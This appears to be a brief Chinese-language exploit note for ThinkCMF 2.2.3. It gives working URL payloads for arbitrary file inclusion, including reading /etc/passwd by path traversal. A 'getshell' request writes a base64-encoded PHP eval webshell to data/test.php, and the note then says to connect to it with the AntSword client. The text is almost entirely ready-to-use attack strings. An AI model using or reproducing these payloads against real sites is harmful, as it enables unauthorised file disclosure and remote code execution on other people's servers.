### thinkcmf

```
版本信息：2.2.3
```

#### 任意文件包含

包含默认文件

```
?a=display&templateFile=README.md
```

![Snipaste_2022-10-17_15-13-34.jpg](images/Snipaste_2022-10-17_15-13-34.jpg)

包含系统敏感文件

```
?a=display&templateFile=../../../../..//etc/passwd
```

![Snipaste_2022-10-17_15-18-56.jpg](images/Snipaste_2022-10-17_15-18-56.jpg)



#### getshell

```
?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('data/test.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4='))</php>
```

![Snipaste_2022-10-17_15-24-14.jpg](images/Snipaste_2022-10-17_15-24-14.jpg)

文件写入到data目录下，使用蚁剑连接

![Snipaste_2022-10-17_15-27-24.jpg](images/Snipaste_2022-10-17_15-27-24.jpg)



